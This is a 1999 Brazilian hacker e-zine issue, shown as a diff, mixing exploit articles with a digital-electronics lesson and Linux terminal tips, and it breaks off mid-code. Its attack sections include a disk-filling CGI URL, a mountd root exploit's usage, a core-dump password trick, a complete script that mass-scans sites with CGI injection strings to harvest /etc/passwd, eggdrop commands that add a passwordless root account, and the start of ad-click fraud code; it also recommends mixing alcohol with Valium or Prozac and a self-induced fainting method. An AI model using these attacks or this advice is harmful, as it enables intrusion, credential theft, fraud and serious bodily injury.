@@ -1,0 +1,1834 @@
+         _____________            ________            ___________
+         ___  __/__  /______      ___  __ \__________ __  /___  /_
+         __  /  __  __ \  _ \     __  / / /  _ \  __ `/  __/_  __ \
+         _  /   _  / / /  __/     _  /_/ //  __/ /_/ // /_ _  / / /
+         /_/    /_/ /_/\___/      /_____/ \___/\__,_/ \__/ /_/ /_/
+
+             ______ __      _____        ______ _____
+             ___  //_/_________(_)______ ___  /___  /________
+             __  ,<  __  __ \_  /__  __ `/_  __ \  __/_  ___/
+             _  /| | _  / / /  / _  /_/ /_  / / / /_ _(__  )
+             /_/ |_| /_/ /_//_/  _\__, / /_/ /_/\__/ /____/
+                                 /____/
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+                        Data estelar:  1.1295174992
+                        Data terrestre:  13/06/1999
+
+DeathKnights #08a
+
+e-mail: death@DeathKnights.com
+
+page: http://www.DeathKnights.com
+
+     melhor visualizado com joe -asis e terminal com setfont alt-8x16. (linux)
+                           melhor visualizado com edit.                (dos)
+
+ ______________________________Death_Knights_________________________________
+ ----------------------------------------------------------------------------
+
+.-----------.
+|   SECOES   \_______________________________________________________________
+`----------------------------------------------------------------------------'
+
+[1]==[ Esclarecimentos & algo mais...               ] [ Cacaio         ]==[1]
+[2]==[ bug no omni httpd server                     ] [ Cacaio         ]==[2]
+[3]==[ Exploit for bug in mountd                    ] [ ReNeGaDe       ]==[3]
+[4]==[ Metodos alucinogenos caseiros                ] [ Cacaio         ]==[4]
+[5]==[ receitinha (ttys)                            ] [ darksystem     ]==[5]
+[6]==[ Pegando Parte do Passwd via telnet           ] [ Cacaio         ]==[6]
+[7]==[ Software roubado da ISS!!!                   ] [ ?????????????? ]==[7]
+[8]==[ Internerd Exploder 5.0                       ] [ Cacaio         ]==[8]
+[9]==[ nem le isso... muito inutil...               ] [ Cacaio         ]==[9]
+[10]=[ Eletronica Digital                           ] [ Dr4271         ]=[10]
+[11]=[ eggdrop.                                     ] [ Cacaio         ]=[11]
+[12]=[ pr0n clicker                                 ] [ HoGs HeaD      ]=[12]
+[13]=[ Novo site                                    ] [ Cacaio         ]=[13]
+[14]=[ Macintosh                                    ] [ Cacaio         ]=[14]
+[15]=[ fraudes com cartoes de credito               ] [ KKR            ]=[15]
+[16]=[ exploit para wu-ftpd's da ver. 12 a 18       ] [ Cacaio         ]=[16]
+[17]=[ Solaris: dtappgather                         ] [ Cacaio         ]=[17]
+[18]=[ Solaris: statd                               ] [ Cacaio         ]=[18]
+[19]=[ Perlshop                                     ] [ Cacaio         ]=[19]
+[20]=[ Ultimas Palavras                             ] [ Cacaio         ]=[20]
+
+-=[  1  ]=-
+.------------------------------------.
+| = Esclarecimentos & algo mais ... = \______________________________________
+`----------------------------------------------------------------------------'
+
+        Nao nos responsabilizamos pela informacao contida neste zine. Se voce
+usar indevidamente qualquer informacao contida aqui, a responsabilidade e' to-
+da sua. Se for pego, preso ou sei la o que, nao nos perturbe e blablabla.
+
+        Por que demorou pra sair o numero 08? Por que nao?!?! :)
+        Voces queriam a informacao, agora ja esta chegando a voces...
+Quanto a bonus, nao vamos mais dar bonus de jeito nenhum. Pela zine podem
+ter aguns meio 'escondidos', sei la... procura ae!
+
+A partir desta edicao voce vai aprender eletronica digital com o Dr4271. E'
+muito interessante e vale a pena...
+
+        Este grupo nao visa nenhum fim lucrativo. Mas se ganharmos alguma
+coisinha nao reclamaremos. heh. Nos fazemos isto por diversao e nada mais.
+
+        Ah!!!! Se voce tiver uma materia qualquer e quiser publica-la aqui,
+basta envia-la em modo TEXTO ASCII por e-mail para death@deathknights.com.
+Vamos ler a materia, avaliar e talvez ela seja publicada. Mande qalquer coisa,
+menos badcoms, trojans, hackear via ftp ou afins.
+
+        ATENCAO: se voce quer se tornar um membro, nos mande um e-mail. Lhe
+sera' enviado um arquivo que voce deve responder, e dependedo dele, voce
+recebera' outro, ate' ser aprovado (ou nao).
+
+        Se voce nao gostou da informacao contida aqui, nao nos perturbe. O
+problema e' todo seu.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  2  ]=-
+.-----------------------------.
+| = bug no omni httpd server = \_____________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Bug simples, bobo, mas pode causar aguns danos aos usuarios do sistema, pois
+ele cria varios arquivos temporarios no servidor ate' que o hd esteja cheio.
+
+Este bug e' por um script cgi, o visadmin.exe, o qual ja vem por default no
+diretorio cgi-bin. Qualquer um pode acessa'-lo.
+
+Basta ir a url:
+http://omni.server/cgi-bin/visadmin.exe?user=guest
+Logico, trocando omni.server pelo endereco de algum servidor omni.
+Aguarde alguns minutos e pronto! O HD esta' cheio.
+
+bahX! =:P
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  3  ]=-
+.------------------------------.
+| = Exploit for bug in mountd = \____________________________________________
+`----------------------------------------------------------------------------'
+                               by ReNeGaDe
+
+      Nesta zine, resolvi falar sobre um bug que alguns nao conhecem ou anda
+esquecido, ele foi usado por um grupo chamado [x]CorporatioN (www.xc0rp.org)
+para que fosse  alterada a  pagina da rede de IRC BrasNET.
+Agora vamos deixar de fofoca e vamos comecar!
+
+      O bin do exploit vai anexado a zine (admmount).
+
+      .--------------------------.
+      | 1.1  Sistemas Afetados    `------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+       RedHat Linux 5.1 k 2.0.35 rpc.mountd
+       Slackware 3.3 k 2.0.33+Solar_Designer's patch rpc.mountd 2.2beta29
+
+      .--------------------------.
+      | 1.2  O Ataque             `------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+      O procedimento consiste em uma simples linha de execucao que se o
+sistema tiver essas caracteristicas o invasor tera accesso remoto  como
+root ao sistema.
+
+     comando:  ./admmount <host> -t <sys>
+
+     Systems: 0 = RedHat  e  1 = Slackware
+
+Ps: O da BrasNET era o RedHat :P
+
+      .--------------------------.
+      | 1.3  Fix                  `------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+      Ah eh obvio ne? Atualiza a bagaceira toda ;)
+
+      Eh isso ae pessoal aqui se encerra minha materia nessa DeathKnights!
+
+      Se  tiverem interesse  em  tirar  duvidas ou  apresentar  novas
+  ideias, aqui estah o meu email. Mais sem babozeiras hein pessoal vamos
+  ter um bom senso pois nao sou desocupado.
+
+         cya l8er!
+
+     ReNeGaDe               renegade@dsgx.org
+     `'`'`'`'               `'`'`'`'`'`'`'`'`
+
+-=[  4  ]=-
+.----------------------------------.
+| = Metodos alucinogenos caseiros = \________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Descreverei aqui dois metodos alucinogenos caseiros. Ambos funcionam muito
+bem.
+
+      .-----------------------------.
+      | Alc0ol.....                  `---------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Este metodo e' bem conhecido, mas mesmo assim vou falar dele. E' simples...
+simplesmente pegue sua bebida alcoolica preferida (cerveja, whiskey, etc),
+beba um copo. No segundo copo, raspe e jogue por cima remedios como Valium 5
+ou Prozac, ou mesmo a erva Kava. Ja com o remedio raspado na bebida, beba.
+Em no maximo 10 minutos voce estara' doidao...
+Caso nao funcione, raspe o remedio, e engula outro comprimido enquanto voce
+bebe este copo. Se nao funcionar... foda-se... com todas as pessoas normais
+funciona, menos com voce... logo voce *NAO* e' normal.
+
+      .---------------------------.
+      | Sacudindo                  `-----------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Voce pode ler isto e pensar... mas que coisa idiota! Ta bom, isso pode ser
+idiota, mas funciona e muito bem.
+Basta seguir os seguintes passos:
+
+1. Fique perto de algum lugar que voce possa cair de costas de repente (uma
+cama, um colchao, etc... mais saiba: voce vai cair e pode morrer se bater a
+cabeca em uma quina.. o que nao seria nada mal)
+
+2. Se agache
+
+3. Respire fundo na sequencia: 2 segundos para dentro, 2 segundos para fora e
+assim em diante... por uns 30 segundos.
+
+4. Logo apos respirar, com a respiracao ofegante ainda, fique de pe'.
+
+5. Abra seus bracos como na figura:
+
+                             `0'
+                           a--|--e
+                              |
+                            _/`\_
+                            bracos
+                           abertos
+
+6. Fique abrindo e fechando os bracos o mais rapido que puder como na
+figura:
+
+                         `0'        `0'
+                         a|e      a--|--e
+                          |          |
+                        _/`\_      _/`\_
+                        bracos     bracos
+                       fechados   abertos
+
+Em no maximo 50 segundos voce caira' para tras. Caso nao caia, tente
+novamente, mas sem medo. Voce precisa estar sem medo para fazer isso...
+senao nao funciona (nao me pergunte o por que).
+
+Agora que voce caiu, voce vera' tudo acontecer bem lentamente ou voce vai
+sentir como se estivesse em outro mundo... outra realidade, como em um
+sonho, mas com uma diferenca: aqui voce escolhe o que vai fazer. No seu
+'sonho' pode-se passar 2 horas, quando realmente se passou somente 30
+segundos. E' divertido.
+
+Ahhhhhh... como voltar? Alguem precisa de te chamar, em no maximo dois
+minutos... ou voce pode ficar meio idiota pro resto da vida. Quando for
+fazer isso faz perto de um amigo e manda ele te chamar de volta `a
+realidade. As vezes e' dificil de trazer de volta... e' preciso bater no rosto da
+pessoa que caiu, jogar agua, etc...
+
+Quando voce volta, voce normalmente esta' tremendo e/ou com a pupila
+dilatada. E' normal.
+
+Faca isso se voce nao tiver mais nada pra fazer, ou quando nao tiver grana
+para comprar alucinogenos caros ou... sei la...
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  5  ]=-
+.----------------------.
+| = receitinha (ttys) = \____________________________________________________
+`----------------------------------------------------------------------------'
+                                by darksystem
+
+   Eaih turminha.. aih vai um esquema pra quem usa mtos terminais no linux..
+Vc vai precisar de:
+
+* /etc/inittab
+* /etc/securetty
+* /etc/ttys
+* 1 chave phillips
+* 1 copo de cafeh
+
+   Primeiro edita o /etc/inittab (qbasic), e procure as linhas:
+
+c1:1235:respawn:/sbin/agetty 38400 tty1 linux
+c2:1235:respawn:/sbin/agetty 38400 tty2 linux
+c3:1235:respawn:/sbin/agetty 38400 tty3 linux
+c4:1235:respawn:/sbin/agetty 38400 tty4 linux
+c5:1235:respawn:/sbin/agetty 38400 tty5 linux
+c6:12345:respawn:/sbin/agetty 38400 tty6 linux
+
+e adicione ao tempero:
+
+c7:12345:respawn:/sbin/agetty 38400 tty7 linux
+c8:12345:respawn:/sbin/agetty 38400 tty8 linux
+c9:12345:respawn:/sbin/agetty 38400 tty9 linux
+c10:12345:respawn:/sbin/agetty 38400 tty10 linux
+c11:12345:respawn:/sbin/agetty 38400 tty11 linux
+c12:12345:respawn:/sbin/agetty 38400 tty12 linux
+
+   Prontinho, agora eh soh levar no /etc/securetty (edit), procurar as
+linhas:
+
+tty1
+tty2
+tty3
+tty4
+tty5
+tty6
+
+e por:
+
+tty7
+tty8
+tty9
+tty10
+tty11
+tty12
+
+e deixe em fogo brando por 30 min, enqnto isso tome o cafeh..
+
+   Agora, vah no /etc/ttys (edit), vc certamente ai achar:
+
+console tty1
+console tty2
+console tty3
+console tty4
+console tty5
+console tty6
+
+e adicione na panela (/etc/ttys):
+
+console tty7
+console tty8
+console tty9
+console tty10
+console tty11
+console tty12
+
+   Pronto, deixe esfriar por 1 hora e meia e sirva a vontade..
+
+* Porcao: 6 terminais
+
+   AAAAAAAAAAAgora, se vc quer tail -f /usr/adm/messages, vai no
+/etc/syslog.conf (notepad) e onde tah a linha:
+
+*.=info;*.=notice                             /usr/adm/messages
+
+vc comenta ela (por um # na frente), e coloque:
+
+*.=info;*.=notice                               /dev/tty12
+
+   Agora, vc pega a chave phillips e bate 3x na mesa do pc pra dar sorte..
+se tudo ocorreu bem, reinicie o fogao.. ops.. computador (menu iniciar,
+desligar, reiniciar computador), se nda queimar eh pq deu certo..
+
+   Bom, ateh a proxima.. []'x [darksystem(auwwx@hotmail.com)]
+                               `'`'`'`'`' `'`'`'`'``'`'`'`'
+
+-=[  6  ]=-
+.---------------------------------------.
+| = Pegando Parte do Passwd via telnet = \___________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Bem.. nao e' bem pelo telnet, mas nao encontrei um titulo melhor e coloquei
+este =:P
+
+Abra 2 telnet's (1 em cada terminal)
+
+Em um dos telnet's entre no host e digite: /bin/login
+
+Entao como login coloque root e uma senha qualquer, mesmo errada, e deixe
+o telnet ainda aberto.
+(isso pode ser feito com qualquer conta)
+
+No outro telnet digite: ps auwx | grep login
+
+Procure o numero do processo do /bin/login e entao digite:
+kill -11 numerodoprocesso
+
+No outro terminal voce deve receber o seguinte:
+
+login: Segmentation fault (core dumped)
+
+Entao agora basta dar um "strings core >qquerfile" e voce deve pegar
+a parte do /etc/passwd sem shadow do login desejado (no caso, root).
+
+So isso.
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  7  ]=-
+.-------------------------------.
+| = Software roubado da ISS!!! = \___________________________________________
+`----------------------------------------------------------------------------'
+
+/*
+ * Copyright (C) 1999 ISS, Inc.
+ *     All Rights Reserved.
+ *
+ * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ISS
+ * The copyright notice above does not evidence any
+ * actual or intended publication of such source code.
+ *
+ * This code can be very dangerous if put in the wrong hands.
+ * Do not distribute.
+ *
+ */
+
+#include <stdio.h>
+
+int main(void)
+{
+	printf("Hello World");
+	return;
+}
+
+     ??????????????
+     `'`'`'`'`'`'`'
+
+-=[  8  ]=-
+.---------------------------.
+| = Internerd Exploder 5.0 = \_______________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Quando alguem com o internerd exploder 5.0 acessar uma pagina como a que
+vem a seguir, o IE ira travar e voce precisara' fecha-lo com ctrl+alt+del.
+
+Ta aqui so' pra, mais uma vez, mostrar como a M$ e' (in)eficiente.
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+<HTML>
+<BODY>
+<SCRIPT>
+
+var color = new Array;
+color[1] = "black";
+color[2] = "white";
+
+for(x = 0; x <3; x++)
+{
+        document.bgColor = color[x]
+        if(x == 2)
+        {
+                x = 0;
+        }
+}
+
+</SCRIPT>
+</BODY>
+</HTML>
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  9  ]=-
+.-----------------------------------.
+| = nem le isso... muito inutil... = \_______________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Eu disse que era inutil, nao disse? Entao olha so', aqui e' so' um shell
+script pra pegar arquivos passwd via bugs em scripts cgi. Ele e' bem util
+pra quando voce nao tem o que fazer, pega uma boa lista de sites e vai
+testando um por um. E' isso o que o script faz: sai testando um por um.
+
+O programa e' auto explicativo, mas qualquer duvida ou qualquer coisa,
+sei la', me manda um e-mail.
+
+AH! Voce precisa de ter o dialog no diretorio do script ou em algum diretorio
+do PATH, e ele deve ser executavel(obvio).
+
+La' vai o script...
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+#!/bin/sh
+function tipocgi {
+dialog --title "Escolha de CGI" --backtitle "The Death Knights cGihaCk pack \
+by Cacaio" --menu "Escolha o tipo de cgi que voce quer procurar/exploitar:" \
+20 74 8 \
+"PHF" "String: phf?Qalias=x%0acat%20/etc/passwd" \
+"PHP" "String: php.cgi?/etc/passwd" \
+"Query" "String: query?%0a/bin/cat%20/etc/passwd" \
+"Faxsurvey" "String: faxsurvey?/bin/cat%20/etc/passwd" \
+"HTMLScript" "String: htmlscript?../../../../etc/passwd" \
+"Webdist" "String: webdist.cgi?distloc=;cat%20/etc/passwd" \
+"Echo" "String: echo?%0Acat%20/etc/passwd" \
+"view-source" "String: view-source?../../../../../etc/passwd" \
+"pfdisplay" "String: pfdispaly.cgi?/../../../../etc/passwd" \
+"campas" "String: campas?%0acat%0a/etc/passwd%0a" 2> saie
+SIPRA="`cat saie`"
+if [ "$SIPRA" = "PHF" ]; then
+echo "phf?Qalias=x%0acat%20/etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "PHP" ]; then
+echo "php.cgi?/etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "Query" ]; then
+echo "query?%0a/bin/cat%20/etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "Faxsurvey" ]; then
+echo "faxsurvey?/bin/cat%20/etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "HTMLScript" ]; then
+echo "htmlscript?../../../../etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "Webdist" ]; then
+echo "webdist.cgi?distloc=;cat%20/etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "Echo" ]; then
+echo "echo?%0Acat%20/etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "view-source" ]; then
+echo "view-source?../../../../../etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "pfdisplay" ]; then
+echo "pfdispaly.cgi?/../../../../etc/passwd" > cgi
+./$0
+fi
+if [ "$SIPRA" = "campas" ]; then
+echo "campas?%0acat%0a/etc/passwd%0a" > cgi
+./$0
+fi
+}
+function principal {
+dialog --title "Menu principal" --backtitle "The Death Knights cGihaCk pack \
+by Cacaio" --menu "0 que voce quer fazer agora?" 20 70 8 \
+"Coletar!" "Coletar enderec0s para tentar exploitar o cgi" \
+"Testar!!" "testar o bug do cgi" \
+"Escolher" "Escolher o script cgi a ser usad0/exploitado" \
+"Ver!!!" "Ver a sua lista atual de alvos    (arquivo lista)" \
+"Limpar" "Limpar todos os arquivos temporarios" \
+"Sobre" "Sobre este pr0grama" \
+"Sair" "Sair do programa" 2> /tmp/.oqfazerr
+}
+principal
+OQFAZER="`cat /tmp/.oqfazerr`"
+if [ "$OQFAZER" = "B" ]; then
+aw noooooo!!!! there is a ripper here!!!!
+fi
+if [ "$OQFAZER" = "Limpar" ]; then
+rm cgi
+rm cgi2
+rm lista
+dialog --title "Status" --backtitle "The Death Knights cGihaCk pack by \
+Cacaio" --msgbox "Pronto! Arquiv0s apagados!" 10 50
+./$0
+fi
+if [ "$OQFAZER" = "Sair" ]; then
+clear
+echo ""
+echo ""
+echo "Voce acaba de usar um programa feito por The Death Knights!"
+echo "[1;34mhttp://www.deathknights.com"
+echo "[0mFeito por Cacaio <cacaio@deathknights.com>"
+echo ""
+echo ""
+echo ""
+fi
+if [ "$OQFAZER" = "Sobre" ]; then
+dialog --title "Sobre" --backtitle "The Death Knights cGihaCk pack by Cacaio" \
+--msgbox "Este programa foi escrito por Cacaio <cacaio@deathknights.com>\nno \
+dia 25/05/1999 no inicio de uma tarde em que nao tinha nada\npara fazer. \nCaso \
+algum bug seja encontrado, favor avisar o autor. \n\n\nAinda nao existep \
+previsao de alguma futura versao. \
+\n\n\n\nO programa e' auto-explicativo, portanto, nada a adicionar. \
+\n\n\n\n                   [ http://www.deathknights.com ]" 20 74
+./$0
+fi
+if [ "$OQFAZER" = "Escolher" ]; then
+tipocgi
+fi
+if [ "$OQFAZER" = "Coletar!" ]; then
+dialog --title "Coletando alvo" --backtitle "The Death Knights cGihaCk pack \
+by Cacaio" --inputbox "Coloque 0 alvo aqui..." 14 72 2> /tmp/.alvo
+ALVO="`cat /tmp/.alvo`"
+lynx -traversal -crawl http://$ALVO
+rm -rf lnk*
+rm -rf travers*
+rm -rf /tmp/.alvo
+
+for site in `cat reject.dat | grep http | grep -v ">" | grep -v "<"`
+do
+  echo $site | cut -d"/" -f3 >> lista.temp
+done
+
+for check in `cat lista.temp`
+do
+  if [ "$check" != "" ]
+  then
+    echo $check >> lista.tmp
+  fi
+done
+
+sort -fd lista.temp | uniq >> lista
+
+rm lista.temp lista.tmp
+./$0
+fi
+OQFAZER="`cat /tmp/.oqfazerr`"
+if [ "$OQFAZER" = "Ver!!!" ]; then
+dialog --title "Lista de alvos" --backtitle "The Death Knights cGihaCk pack \
+by Cacaio" --textbox "lista" 20 70
+./$0
+fi
+if [ "$OQFAZER" = "Testar!!" ]; then
+dialog --title "Checar alvos" --backtitle "The Death Knights cGihaCk pack by \
+Cacaio" --msgbox "Aperte enter para c0mecar.\n Pode ser muito demorado \
+dependendo do tamanh0 da lista." 14 72 2> /tmp/.alvo
+ALVO="`cat /tmp/.alvo`"
+cgiprair="`cat cgi`"
+for alvo in `cat lista`
+do
+echo Checking $alvo ...
+lynx -dump http://$alvo/cgi-bin/$cgiprair > $alvo.temp
+if cat $alvo.temp | grep root:
+then
+mv $alvo.temp $alvo.pwd
+echo "With the help of The Death Knighs" >> $alvo.pwd
+echo "http://www.deathknights.com" >> $alvo.pwd
+echo "Program made by Cacaio..." >> $alvo.pwd
+else
+rm $alvo.temp
+fi
+done
+./$0
+fi
+clear
+echo ""
+echo ""
+echo "Voce acaba de usar um programa feito por The Death Knights!"
+echo "[1;34mhttp://www.deathknights.com"
+echo "[0mFeito por Cacaio <cacaio@deathknights.com>"
+echo ""
+echo ""
+echo ""
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+Usem e abusem :)
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  10  ]=-
+.-----------------------.
+| = Eletronica Digital = \___________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Dr4217
+
+A primeira coisa q voce deve aprender sobre E.D.  eh a conversao de binario p/
+decimal e decimal p/ binario, mas ja existe  essa  materia na zine  numero  3.
+
+O proximo assunto a abordado e o conhecimento  de  portas e funcoes logias.
+
+        .------------------------------------------.
+        | Portas e funcoes logicas                  `--------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Voce deve sempre ter em mente q os circuitos digitais admitem apanas os niveis
+1 (um) e 0 (zero). O  estado ZERO  representara  por exemplo: Portao  fechado,
+aparelho desligado, ausencia  de tensao, chave aberta, nao... O  estado UM re-
+presentara: Portao aberto, aparelho ligado, presensa de tensao, chave fechada,
+sim...
+Note entao q representamos 0 por uma situacao e 1 pela situacao contraria.
+Cada veriavel booleana da funcao logica pode assumir somente 2 funcoes  0
+ou 1.
+
+        .-------------------------------------.
+        | 1 - Funcao E ou AND                  `-------------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+A funcao E eh aquela q executa a multiplicacao de 2 ou mais  variaveis  boole-
+anas. Sua representacao algebrica eh  S= A.B Le-se S= A e B.
+           Onde
+           S = Saida
+           A = Entrada A
+           B = Entrada B
+
+Para melhor compreesao veja o circuito representativo da fig1.1 do arquivo
+ed.gif
+
+Note que a saida deste circuito representada no exemplo por uma lampada, so a-
+cendera se as chaves A e B forem fechadas, caso apenas uma das chaves esteja
+aberta entao a lampada nao acendera. Podemos agora construir uma tabela verda-
+de.
+
+   +----------------+
+   | TABELA VERDADE |
+   +----------------+
+
+ Niveis de entrada     Saida
+ A   .   B             S
+ 0       0 ----------> 0
+ 0       1 ----------> 0
+ 1       0 ----------> 0
+ 1       1 ----------> 1
+
+Agora so falta vode saber como a porta E (AND) eh simbolizada. Veja na
+fig1.2
+
+        .-------------------------------------.
+        | 2 - Funcao OU ou OR                  `-------------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Nesta funcao para que a saida seja 1, basta que uma das condicoes seja 1. Sua
+representacao algebrica eh S= A+B Le-se S= A ou B.
+
+Para melhor compreesao veja a fig2.1
+
+Note que para acender a lampada deste circuito basta que uma ou mais das cha-
+ves esteja fechada. Vamos ver agora a tabela verdade.
+
+   +----------------+
+   | TABELA VERDADE |
+   +----------------+
+
+ Niveis de entrada     Saida
+ A   +   B             S
+ 0       0 ----------> 0
+ 0       1 ----------> 1
+ 1       0 ----------> 1
+ 1       1 ----------> 1
+
+Obs.: Na ultima linha da tabela voce ve 1+1=1, mas na verdade lembrese de que
+nao eh 1 mais 1 = 1 e sim 1 UO 1 = 1.
+
+Veja como  a porta UO (OR) eh simbolizada na fig2.2
+
+        .-----------------------------------------.
+        | 3 - A funcao NAO ou NOT                  `---------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+A funcao  NOT eh tao simples quanto importante. Seu objetivo eh de negar o es-
+tado de entrada. Se por exemplo a entrada em uma porta _  not  for  0 sua sai-
+da sera 1 e vice-versa. A representacao algebrica eh S=A ou S=A' Le-se A BARRA
+ou NAO A.
+                                               _
+OBS.: A representacao mais comum de A Barra eh A.
+
+Veja o circuito da fig3.1
+
+Neste circuito eh preciso explicar como eh feita a negacao. Numa primeira ana-
+lize a chave A esta aberta 0, entao a correte passa pela lampada acendendo-a.
+Ou seja Chave em 0 e saida em 1. Agora vamos supor que a chave  esteja fechada
+1, entao toda a corrente passara por ela  nao acedendo a lampada.Ou seja chave
+1 e saida 0 .Isso ocorre porque a corrente eletrica  em  um  cirduito  procura
+sempre o caminho mais facil de percorrer, no  nosso  circuito  a chave fechada
+com resistencia desconsideravel.
+
+Vamos ver a tabela verdade da porta OR
+
+   +----------------+
+   | TABELA VERDADE |
+   +----------------+
+
+ Nivel de entrada    Saida
+ A                   S
+ 0 ----------------> 1
+ 1 ----------------> 0
+
+Veja a simbologia da porta OR na fig3.2
+
+        .---------------------------------------.
+        | 4 - Funcao NE ou NAND                  `-----------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+A funcao NAND eh a juncao da funcao AND com NOT. Eh o mesmo circuito AND, porem
+sua saida eh nagada. Sua representacao algebrica eh S=(A.B)' Le-se S igual
+A e B Barra.
+
+Veja tabela verdade da porta NAND
+
+   +----------------+
+   | TABELA VERDADE |
+   +----------------+
+
+ Niveis de entrada     Saida
+ A   .   B             S
+ 0       0 ----------> 1
+ 0       1 ----------> 1
+ 1       0 ----------> 1
+ 1       1 ----------> 0
+
+Veja sua representacao simbolica da porta NAND na fig4.1
+
+        .-----------------------------------------.
+        | 5 - A funcao NOU ou NOR                  `---------------------.
+        `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+A funcao NOR eh a juncao das funcoes NOT e OR. Sua representacao algebrica eh
+S= (A+B)' Le-se S igual A ou B barra.
+
+Vejamos a tabela Verdade NOR
+
+   +----------------+
+   | TABELA VERDADE |
+   +----------------+
+
+ Niveis de entrada     Saida
+ A   +   B             S
+ 0       0 ----------> 1
+ 0       1 ----------> 0
+ 1       0 ----------> 0
+ 1       1 ----------> 0
+
+Veja a representacao simbolica da porta NOR na fig5.1
+
+Nessa edicao a materia acaba aqui. Mas apronfundaremos mais sobre eletronica
+Digital na proxima edicao.
+
+     Dr4217
+     `'`'`'
+
+-=[  11  ]=-
+.-------------.
+| = eggdrop. = \_____________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+Uma coisinha aqui que algumas pessoas ainda fazem: rodam eggdrop como ROOT!
+
+Se isto acontecer, algum usuario pode simplesmente fazer o seguinte na
+partyline:
+
+<lUser> .tcl exec cat /etc/passwd
+[1:11] <lamebot> Tcl: root:ZynKK/6iOOQ3z:0:0:root:/:/bin/bash
+[1:11] <lamebot> Tcl: bin:*:1:1:bin:/bin:
+[1:11] <lamebot> Tcl: daemon:*:2:2:daemon:/sbin:
+[1:11] <lamebot> Tcl: adm:*:3:4:adm:/var/adm:
+[1:11] <lamebot> Tcl: lp:*:4:7:lp:/var/spool/lpd:
+[1:11] <lamebot> Tcl: sync:*:5:0:sync:/sbin:/bin/sync
+
+Ou entao:
+
+.tcl exec echo "Fatima::0:0:/:/bin/bash" >> /etc/passwd
+
+Ou ainda brincar com o .rhosts ou qualquer outra coisa que voce imaginar.
+Solucao: nao seja tao burro pra ficar rodando programas como root. Crie
+um usuario pra isso.
+
+blehg!
+
+     Cacaio               cacaio@deathknights.com
+     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`
+
+-=[  12  ]=-
+.-----------------.
+| = pr0n clicker = \_________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by HoGs HeaD
+
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+/* pr0n clicker 1.0 by HoGs HeaD
+ * -----------------------------
+ * Howdy. Whoah, it's been a while since I released a program! Well, su1d
+ * gave me the idea for this program and he is supposedly going to make a
+ * Windows version soon.
+ *
+ * What this program does: You know those banners that give you ten cents
+ * or something cheap when they're clicked? Well, this program will click
+ * a banner with a list of wingates you have, so you can just have a large
+ * list of wingates, turn this on, and start gaining some money.
+ *
+ * This also has functions for downloading http files through wingates or just
+ * plain downloading the http file. You may use these functions provided they
+ * are in a different program than this, and that you don't sell the program
+ * you use that code for. When you download this code you agree to not claim
+ * this code as your own.
+ *
+ * Special thanks to: SIN, duke(for being a massah debugger), su1d(for the
+ * idea)
+ * ------- hawgshead@yahoo.com ------------------------------------- */
+
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
+
+/* Cute function to download an HTTP file, compliments of me. */
+
+void downloadHttpFile(char *server, char *file)
+{
+   FILE *fp;
+   struct hostent *getFrom;
+   struct sockaddr_in from;
+   char inBuff[100], *oldBuff, outBuff[100];
+   int sckFd, isConnected, numSent;
+
+   if(isdigit(*server)){
+      from.sin_addr.s_addr = inet_addr(server);
+   }else{
+      getFrom = gethostbyname(server);
